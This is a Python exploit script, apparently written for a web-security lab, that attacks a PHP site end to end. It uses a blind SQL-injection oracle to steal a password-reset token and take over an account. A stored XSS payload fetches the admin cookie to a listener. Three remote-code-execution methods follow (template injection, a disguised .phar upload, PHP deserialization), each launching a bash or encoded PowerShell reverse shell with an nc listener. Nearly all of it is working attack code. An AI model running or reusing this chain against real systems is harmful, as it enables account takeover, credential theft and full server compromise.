import base64
import socket
import threading

import requests
import sys
import time
import random
import string

TARGET_URL = "http://localhost:8000"
VICTIM_USER = "user1"
NEW_PASSWORD = "Password123!"
LHOST = "localhost"  # Change this to your attacker's IP address
LPORT = 8001

def login_bypass():
    print("[*] --- PHASE 1: LOGIN BYPASS ---")
    session = requests.Session()
    
    # 1. Trigger password reset
    print(f"[*] Triggering password reset for {VICTIM_USER}...")
    r = session.post(f"{TARGET_URL}/forgotpassword.php", data={"username": VICTIM_USER})
    if "Email sent!" not in r.text:
        print("[-] Failed to trigger password reset.")
        return

    # 2. Define SQLi Oracle
    def oracle(query):
        r = session.post(
            f"{TARGET_URL}/forgotusername.php",
            data={"username": f"{query};--"}
        )
        return "User exists!" in r.text

    # 3. Find UID
    print("[*] Locating UID...")
    uid = -1
    for i in range(10):
        if oracle(f"{VICTIM_USER}' and uid={i}"):
            uid = i
            break
            
    if uid == -1:
        print("[-] Could not find UID.")
        return
    print(f"[+] Found UID: {uid}")

    # 4. Dump Token
    print("[*] Dumping reset token: ", end="", flush=True)
    token = ""
    for i in range(1, 33):
        low = 48
        high = 122
        while low <= high:
            mid = (low + high) // 2
            
            sqli_greater = f"{VICTIM_USER}' and (select ascii(substring(token,{i},1)) from tokens where uid={uid} order by tid limit 1) > '{mid}'"
            sqli_less = f"{VICTIM_USER}' and (select ascii(substring(token,{i},1)) from tokens where uid={uid} order by tid limit 1) < '{mid}'"
            
            if oracle(sqli_greater):
                low = mid + 1
            elif oracle(sqli_less):
                high = mid - 1
            else:
                token += chr(mid)
                print(chr(mid), end="", flush=True)
                break
    print()

    # 5. Reset the password (FIXED PARAMETERS)
    print(f"[*] Resetting password for {VICTIM_USER}...")
    reset_data = {
        "token": token, 
        "password1": NEW_PASSWORD, 
        "password2": NEW_PASSWORD
    }
    r = session.post(f"{TARGET_URL}/resetpassword.php", data=reset_data)
    
    if "Password changed!" in r.text:
        print("[+] Password reset request sent!")
    else:
        print("[-] Password reset might have failed.")
        return

    # 6. Verify Login Bypass
    print("[*] Verifying login bypass...")
    login_data = {
        "username": VICTIM_USER,
        "password": NEW_PASSWORD
    }
    
    r_login = session.post(f"{TARGET_URL}/login.php", data=login_data, allow_redirects=True)
    
    # Provera preko URL-a umesto teksta, jer je pouzdanija (302 redirect na index.php)
    if r_login.url.endswith("index.php") or "Logout" in r_login.text:
        print(f"[+] SUCCESS: Logged in as {VICTIM_USER}!")
        print("[*] Forward this session data to the Privilege Escalation team:")
        print(f"    Cookies: {session.cookies.get_dict()}")
        return session
    else:
        print("[-] Login verification failed.")
        return None

def privilege_escalation(session):
    print("\n[*] --- PHASE 2: PRIVILEGE ESCALATION (XSS) ---")
    
    b64 = base64.b64encode(f"fetch('http://{LHOST}:{LPORT}/'+btoa(document.cookie))".encode()).decode()
    payload = f"<img src=x onerror='eval(atob(`{b64}`))'/>"
    
    # Using previous session to add payload
    r = session.post(f"{TARGET_URL}/profile.php", data={"description": payload})
    print(f"[*] Set {VICTIM_USER}'s description to XSS payload")
    
    # Waiting for admin bot to visit profile and send cookie
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(1)
    print(f"[*] Listening on {LHOST}:{LPORT}...")
    print("[*] Waiting for admin bot to visit profile...")
    
    # Catch the incoming connection from admin bot
    (sock_c, ip_c) = s.accept()
    get_request = sock_c.recv(4096)
    
    try:
        admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
        print(f"[+] Got admin cookie: {admin_cookie}")
        
        # Close sockets
        sock_c.close()
        s.close()
        
        # Return the admin cookie for further use in privilege escalation
        return admin_cookie
    except Exception as e:
        print("[-] Error decoding admin cookie.")
        return None
    
def rce_ssti(session, admin_cookie, lhost, lport):
    """RCE #1: Server-Side Template Injection (SSTI) u MotD"""
    print("\n[*] --- PHASE 3a: RCE via SSTI (MotD) ---")
    
    # Payload za reverse shell
    payload = "{php}" + f"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\")" + "{/php}"
    
    # Postavi MotD na payload
    r = session.post(
        f"{TARGET_URL}/admin/update_motd.php",
        headers={"cookie": f"PHPSESSID={admin_cookie}"},
        data={"message": payload}
    )
    
    if "Message set!" in r.text:
        print("[+] MotD set to payload")
        
        # Pokreni listener u pozadini
        import subprocess
        import threading
        def start_listener():
            subprocess.run(f"nc -nvlp {lport}", shell=True)
        
        listener_thread = threading.Thread(target=start_listener)
        listener_thread.daemon = True
        listener_thread.start()
        print(f"[*] Listener started on port {lport}")
        
        # Trigger payload posetom homepage
        time.sleep(1)
        session.get(
            f"{TARGET_URL}/index.php",
            headers={"cookie": f"PHPSESSID={admin_cookie}"}
        )
        print("[+] Payload triggered! Check your listener for shell.")
        return True
    else:
        print("[-] Failed to set MotD")
        return False

def rce_image_upload(session, admin_cookie, lhost, lport):
    """RCE #2: Image upload sa .phar ekstenzijom"""
    print("\n[*] --- PHASE 3b: RCE via Image Upload ---")
    
    # VAŽNO: Koristi .phar umesto .php (server blokira .php)
    random_filename = ''.join(random.choice(string.ascii_letters) for _ in range(8)) + '.phar'
    
    # Bash reverse shell payload (za Linux server)
    bash_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    php_payload = f"<?php exec(\"{bash_cmd}\"); ?>"
    
    # GIF87a header za getimagesize() bypass
    image_payload = f"GIF87a{php_payload}"
    
    files = {
        "title": (None, "POC"),
        # MIME tip image/gif (klijent kontroliše)
        "image": (random_filename, image_payload, "image/gif")
    }
    
    r = session.post(
        f"{TARGET_URL}/admin/upload_image.php",
        files=files,
        cookies={"PHPSESSID": admin_cookie}
    )
    
    print(f"[*] Uploaded: {random_filename}")
    print(f"[*] Ekstenzija .phar (prolazi blacklist-u)")
    print(f"[*] GIF87a header (prolazi getimagesize())")
    print(f"[*] MIME type image/gif (klijent kontroliše)")
    
    # Trigger payload - fajl je u images folderu
    trigger_url = f"{TARGET_URL}/images/{random_filename}"
    print(f"[*] Triggering: {trigger_url}")
    session.get(trigger_url)
    
    print("[+] Payload triggered! Check your listener.")
    return True

def rce_deserialize(session, admin_cookie, lhost, lport):
    """RCE #3: PHP deserialization with PowerShell reverse shell"""
    print("\n[*] --- PHASE 3c: RCE via Deserialization (PowerShell) ---")
    
    # Generiši random filename
    random_filename = ''.join(random.choice(string.ascii_letters) for _ in range(8)) + '.phar'
    
    # PowerShell reverse shell
    ps_payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    
    import base64
    encoded_payload = base64.b64encode(ps_payload.encode('utf-16le')).decode()
    powershell_cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_payload}"
    
    shell_code = f"<?php system('{powershell_cmd}'); ?>"
    file_path = f"/var/www/html/{random_filename}"
    
    serialized = f'O:3:"Log":2:{{s:1:"f";s:{len(file_path)}:"{file_path}";s:1:"m";s:{len(shell_code)}:"{shell_code}";}}'
    
    r = session.post(
        f"{TARGET_URL}/admin/import_user.php",
        cookies={"PHPSESSID": admin_cookie},
        data={"userobj": serialized}
    )
    
    print(f"[*] Imported user/payload (will write to {random_filename})")
    
    # Trigger payload
    print(f"[*] Triggering payload ({random_filename})...")
    session.get(f"{TARGET_URL}/{random_filename}")
    
    print("[+] Payload triggered! Check your listener for shell.")
    return True

def remote_code_execution(session, admin_cookie):
    """Glavna RCE funkcija - pokušava sva tri metoda"""
    print("\n" + "="*60)
    print("PHASE 3: REMOTE CODE EXECUTION")
    print("="*60)
    
    # Pitaj korisnika koji metod želi da koristi
    print("\nRCE Methods available:")
    print("1. SSTI (Message of the Day) - Najlakši")
    print("2. Image Upload with PHP payload")
    print("3. PHP Deserialization")
    print("4. Try ALL methods")
    
    choice = input("\nSelect method (1-4): ").strip()
    
    # Postavke za reverse shell
    lhost = input(f"Enter LHOST [default: {LHOST or '127.0.0.1'}]: ").strip()
    if not lhost:
        lhost = LHOST if LHOST else "127.0.0.1"
    
    lport = input(f"Enter LPORT [default: {LPORT}]: ").strip()
    if not lport:
        lport = LPORT
    
    # Izvrši izabrani metod
    if choice == "1":
        rce_ssti(session, admin_cookie, lhost, lport)
    elif choice == "2":
        rce_image_upload(session, admin_cookie, lhost, lport)
    elif choice == "3":
        rce_deserialize(session, admin_cookie, lhost, lport)
    elif choice == "4":
        print("\n[*] Trying all RCE methods...")
        rce_ssti(session, admin_cookie, lhost, lport)
        time.sleep(2)
        rce_image_upload(session, admin_cookie, lhost, lport)
        time.sleep(2)
        rce_deserialize(session, admin_cookie, lhost, lport)
    else:
        print("[-] Invalid choice")
        return False
    
    # Održavaj shell otvorenim
    print("\n[*] Shell should be active. Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
    
    return True

def test_upload(session, admin_cookie):
    print("\n[*] TEST: Provera upload-a...")
    
    test_file = "test_" + ''.join(random.choice(string.ascii_letters) for _ in range(5)) + '.php'
    
    # Jednostavan PHP info
    test_code = "<?php echo 'UPLOAD_WORKS_' . phpversion(); ?>"
    test_payload = f"GIF87a{test_code}"
    
    files = {
        "title": (None, "Test"),
        "image": (test_file, test_payload, "image/gif")
    }
    
    r = session.post(
        f"{TARGET_URL}/admin/upload_image.php",
        files=files,
        cookies={"PHPSESSID": admin_cookie}
    )
    
    print(f"[*] Upload response status: {r.status_code}")
    print(f"[*] Response text: {r.text[:200]}")
    
    # Pokušaj da pristupiš fajlu
    test_url = f"{TARGET_URL}/images/{test_file}"
    resp = session.get(test_url)
    
    print(f"[*] GET {test_url} -> status: {resp.status_code}")
    
    if "UPLOAD_WORKS" in resp.text:
        print(f"[+] UPLOAD RADI! Output: {resp.text[:100]}")
        return True
    else:
        print(f"[-] Upload ne radi ili je fajl na drugoj putanji")
        print(f"    Response: {resp.text[:200]}")
        return False

def find_upload_path(session, admin_cookie):
    print("\n[*] TEST: Traženje putanje za upload...")
    
    unique_name = "path_test_" + ''.join(random.choice(string.ascii_letters) for _ in range(6)) + '.txt'
    
    # Upload txt fajl sa unique sadržajem
    test_content = f"TEST_{unique_name}"
    files = {
        "title": (None, "Test"),
        "image": (unique_name, test_content, "text/plain")
    }
    
    session.post(
        f"{TARGET_URL}/admin/upload_image.php",
        files=files,
        cookies={"PHPSESSID": admin_cookie}
    )
    
    # Proveri sve moguće putanje
    paths = [
        f"{TARGET_URL}/images/{unique_name}",
        f"{TARGET_URL}/uploads/{unique_name}",
        f"{TARGET_URL}/content/{unique_name}",
        f"{TARGET_URL}/files/{unique_name}",
        f"{TARGET_URL}/assets/{unique_name}",
        f"{TARGET_URL}/{unique_name}",
        f"{TARGET_URL}/upload/{unique_name}",
    ]
    
    for path in paths:
        resp = session.get(path)
        if test_content in resp.text:
            print(f"[+] Fajl pronađen na: {path}")
            return path
    
    print("[-] Fajl nije pronađen ni na jednoj putanji")
    return None

def check_admin_pages(session, admin_cookie):
    print("\n[*] TEST: Provera admin stranica...")
    
    admin_pages = [
        "/admin/upload_image.php",
        "/admin/index.php", 
        "/admin/dashboard.php",
        "/admin/import_user.php"
    ]
    
    for page in admin_pages:
        r = session.get(
            f"{TARGET_URL}{page}",
            cookies={"PHPSESSID": admin_cookie}
        )
        print(f"[*] {page}: {r.status_code}")
        
        if r.status_code == 200:
            print(f"    [+] Dostupno!")
            if "upload" in page:
                # Proveri da li forma ima enctype
                if "enctype" in r.text:
                    print("    [+] Upload forma pronađena")

# if __name__ == "__main__":
#     session = login_bypass()
#     if session:
#         admin_cookie = privilege_escalation(session)


if __name__ == "__main__":
    # Podesi LHOST ako nije setovan
    if not LHOST:
        LHOST = input("Enter your LHOST IP address: ").strip()
    
    # Faza 1: Login Bypass
    session = login_bypass()
    
    if session:
        # Faza 2: Privilege Escalation (XSS) da dobijemo admin cookie
        admin_cookie = privilege_escalation(session)

        # admin_cookie = "2010a9964a8268f263b3337f0400af40"  # Hardkodovani admin cookie za testiranje RCE faze bez čekanja na XSS
        
        if admin_cookie:
            # Faza 3: Remote Code Execution
            remote_code_execution(session, admin_cookie)
        else:
            print("\n[-] Failed to get admin cookie. RCE phase skipped.")
    else:
        print("\n[-] Login bypass failed. Exiting.")